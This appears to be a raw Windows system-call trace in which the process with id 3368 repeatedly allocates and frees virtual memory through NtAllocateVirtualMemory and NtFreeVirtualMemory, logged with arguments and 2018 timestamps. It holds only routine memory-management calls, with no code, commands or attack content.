NtFreeVirtualMemory,0xffffffff#671744#32768#3368#0x02350000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#679936#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#675840#32768#3368#0x01700000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#684032#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#679936#32768#3368#0x02350000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#688128#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#684032#32768#3368#0x01700000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#692224#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#688128#32768#3368#0x02350000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#696320#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#692224#32768#3368#0x01700000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#700416#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#696320#32768#3368#0x02350000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#704512#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#700416#32768#3368#0x01700000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#708608#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#704512#32768#3368#0x02350000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#712704#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#708608#32768#3368#0x01700000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#724992#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#712704#32768#3368#0x02350000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#729088#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#724992#32768#3368#0x01700000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#757760#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#729088#32768#3368#0x02350000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#761856#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#757760#32768#3368#0x01700000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#765952#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#761856#32768#3368#0x02350000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#770048#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#765952#32768#3368#0x01700000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#774144#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#770048#32768#3368#0x02350000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#786432#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#774144#32768#3368#0x01700000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02410000#4096#4#0#802816#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#786432#32768#3368#0x02350000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024e0000#4096#4#0#819200#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#802816#32768#3368#0x02410000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#823296#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#819200#32768#3368#0x024e0000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02420000#4096#4#0#827392#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#823296#32768#3368#0x02350000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#831488#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#827392#32768#3368#0x02420000,0,1542888173.09375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02420000#4096#4#0#835584#3368,0,1542888173.09375
NtFreeVirtualMemory,0xffffffff#831488#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#839680#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#835584#32768#3368#0x02420000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02420000#4096#4#0#843776#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#839680#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#847872#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#843776#32768#3368#0x02420000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02420000#4096#4#0#851968#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#847872#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x024f0000#4096#4#0#856064#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#851968#32768#3368#0x02420000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#860160#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#856064#32768#3368#0x024f0000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02430000#4096#4#0#864256#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#860160#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#868352#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#864256#32768#3368#0x02430000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02430000#4096#4#0#872448#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#868352#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#876544#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#872448#32768#3368#0x02430000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02430000#4096#4#0#880640#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#876544#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#884736#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#880640#32768#3368#0x02430000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02430000#4096#4#0#888832#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#884736#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#892928#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#888832#32768#3368#0x02430000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02430000#4096#4#0#897024#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#892928#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#901120#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#897024#32768#3368#0x02430000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02430000#4096#4#0#905216#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#901120#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#909312#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#905216#32768#3368#0x02430000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02430000#4096#4#0#913408#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#909312#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#917504#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#913408#32768#3368#0x02430000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02430000#4096#4#0#921600#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#917504#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02520000#4096#4#0#925696#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#921600#32768#3368#0x02430000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#929792#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#925696#32768#3368#0x02520000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02440000#4096#4#0#933888#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#929792#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#937984#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#933888#32768#3368#0x02440000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02440000#4096#4#0#942080#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#937984#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#946176#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#942080#32768#3368#0x02440000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02440000#4096#4#0#950272#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#946176#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#954368#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#950272#32768#3368#0x02440000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02440000#4096#4#0#958464#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#954368#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#962560#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#958464#32768#3368#0x02440000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02440000#4096#4#0#966656#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#962560#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#970752#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#966656#32768#3368#0x02440000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02440000#4096#4#0#974848#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#970752#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#978944#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#974848#32768#3368#0x02440000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02440000#4096#4#0#983040#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#978944#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02530000#4096#4#0#987136#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#983040#32768#3368#0x02440000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#991232#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#987136#32768#3368#0x02530000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02450000#4096#4#0#995328#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#991232#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#999424#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#995328#32768#3368#0x02450000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02450000#4096#4#0#1003520#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#999424#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1007616#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1003520#32768#3368#0x02450000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02450000#4096#4#0#1011712#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1007616#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1015808#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1011712#32768#3368#0x02450000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02450000#4096#4#0#1019904#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1015808#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1024000#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1019904#32768#3368#0x02450000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02450000#4096#4#0#1028096#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1024000#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1032192#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1028096#32768#3368#0x02450000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02450000#4096#4#0#1036288#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1032192#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1040384#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1036288#32768#3368#0x02450000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02450000#4096#4#0#1044480#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1040384#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1048576#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1044480#32768#3368#0x02450000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02450000#4096#4#0#1052672#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1048576#32768#3368#0x02350000,0,1542888173.10975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02560000#4096#4#0#1056768#3368,0,1542888173.10975
NtFreeVirtualMemory,0xffffffff#1052672#32768#3368#0x02450000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1060864#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1056768#32768#3368#0x02560000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02460000#4096#4#0#1064960#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1060864#32768#3368#0x02350000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1073152#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1064960#32768#3368#0x02460000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02460000#4096#4#0#1077248#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1073152#32768#3368#0x02350000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1081344#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1077248#32768#3368#0x02460000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02460000#4096#4#0#1085440#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1081344#32768#3368#0x02350000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1089536#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1085440#32768#3368#0x02460000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02460000#4096#4#0#1093632#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1089536#32768#3368#0x02350000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1097728#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1093632#32768#3368#0x02460000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02460000#4096#4#0#1105920#3368,0,1542888173.12475
NtFreeVirtualMemory,0xffffffff#1097728#32768#3368#0x02350000,0,1542888173.12475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1110016#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1105920#32768#3368#0x02460000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02460000#4096#4#0#1114112#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1110016#32768#3368#0x02350000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02570000#4096#4#0#1118208#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1114112#32768#3368#0x02460000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1126400#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1118208#32768#3368#0x02570000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02470000#4096#4#0#1130496#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1126400#32768#3368#0x02350000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1134592#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1130496#32768#3368#0x02470000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02470000#4096#4#0#1138688#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1134592#32768#3368#0x02350000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1142784#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1138688#32768#3368#0x02470000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02470000#4096#4#0#1146880#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1142784#32768#3368#0x02350000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1150976#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1146880#32768#3368#0x02470000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02470000#4096#4#0#1155072#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1150976#32768#3368#0x02350000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1159168#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1155072#32768#3368#0x02470000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02470000#4096#4#0#1163264#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1159168#32768#3368#0x02350000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1167360#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1163264#32768#3368#0x02470000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02470000#4096#4#0#1171456#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1167360#32768#3368#0x02350000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1175552#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1171456#32768#3368#0x02470000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02470000#4096#4#0#1179648#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1175552#32768#3368#0x02350000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02590000#4096#4#0#1183744#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1179648#32768#3368#0x02470000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1191936#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1183744#32768#3368#0x02590000,0,1542888173.14075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02480000#4096#4#0#1196032#3368,0,1542888173.14075
NtFreeVirtualMemory,0xffffffff#1191936#32768#3368#0x02350000,0,1542888173.15675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1200128#3368,0,1542888173.15675
NtFreeVirtualMemory,0xffffffff#1196032#32768#3368#0x02480000,0,1542888173.15675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02480000#4096#4#0#1204224#3368,0,1542888173.15675
NtFreeVirtualMemory,0xffffffff#1200128#32768#3368#0x02350000,0,1542888173.15675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1208320#3368,0,1542888173.15675
NtFreeVirtualMemory,0xffffffff#1204224#32768#3368#0x02480000,0,1542888173.15675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02480000#4096#4#0#1212416#3368,0,1542888173.15675
NtFreeVirtualMemory,0xffffffff#1208320#32768#3368#0x02350000,0,1542888173.15675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1220608#3368,0,1542888173.15675
NtFreeVirtualMemory,0xffffffff#1212416#32768#3368#0x02480000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02480000#4096#4#0#1224704#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1220608#32768#3368#0x02350000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1228800#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1224704#32768#3368#0x02480000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02480000#4096#4#0#1232896#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1228800#32768#3368#0x02350000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1236992#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1232896#32768#3368#0x02480000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02480000#4096#4#0#1241088#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1236992#32768#3368#0x02350000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02480000#4096#4#0#1253376#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1245184#32768#3368#0x02350000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x025c0000#4096#4#0#1257472#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1253376#32768#3368#0x02480000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1261568#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1257472#32768#3368#0x025c0000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02490000#4096#4#0#1265664#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1261568#32768#3368#0x02350000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1269760#3368,0,1542888173.17175
NtFreeVirtualMemory,0xffffffff#1265664#32768#3368#0x02490000,0,1542888173.17175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02490000#4096#4#0#1273856#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1269760#32768#3368#0x02350000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1277952#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1273856#32768#3368#0x02490000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02490000#4096#4#0#1282048#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1277952#32768#3368#0x02350000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1286144#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1282048#32768#3368#0x02490000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02490000#4096#4#0#1290240#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1286144#32768#3368#0x02350000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1294336#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1290240#32768#3368#0x02490000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02490000#4096#4#0#1298432#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1294336#32768#3368#0x02350000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1302528#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1298432#32768#3368#0x02490000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02490000#4096#4#0#1306624#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1302528#32768#3368#0x02350000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1310720#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1306624#32768#3368#0x02490000,0,1542888173.18775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02490000#4096#4#0#1314816#3368,0,1542888173.18775
NtFreeVirtualMemory,0xffffffff#1310720#32768#3368#0x02350000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x025e0000#4096#4#0#1318912#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1314816#32768#3368#0x02490000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1323008#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1318912#32768#3368#0x025e0000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024a0000#4096#4#0#1327104#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1323008#32768#3368#0x02350000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1331200#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1327104#32768#3368#0x024a0000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024a0000#4096#4#0#1335296#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1331200#32768#3368#0x02350000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1339392#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1335296#32768#3368#0x024a0000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024a0000#4096#4#0#1343488#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1339392#32768#3368#0x02350000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1347584#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1343488#32768#3368#0x024a0000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024a0000#4096#4#0#1351680#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1347584#32768#3368#0x02350000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1355776#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1351680#32768#3368#0x024a0000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024a0000#4096#4#0#1359872#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1355776#32768#3368#0x02350000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1363968#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1359872#32768#3368#0x024a0000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024a0000#4096#4#0#1368064#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1363968#32768#3368#0x02350000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1372160#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1368064#32768#3368#0x024a0000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024a0000#4096#4#0#1376256#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1372160#32768#3368#0x02350000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x025f0000#4096#4#0#1380352#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1376256#32768#3368#0x024a0000,0,1542888173.20375
